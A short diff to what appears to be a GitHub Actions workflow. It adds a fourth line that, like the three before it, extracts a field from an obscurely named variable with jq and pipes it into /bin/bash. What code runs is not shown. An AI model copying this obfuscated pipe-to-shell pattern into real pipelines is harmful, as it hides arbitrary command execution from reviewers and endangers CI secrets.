@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$jcqn14" | jq -r .fnjo1 | /bin/bash
           echo $kyfbc3 | jq -r .s1 | /bin/bash
           echo $m104 | jq -r .xan40 | /bin/bash
+          printf '%s' "$plngj1" | jq -r .g63373 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
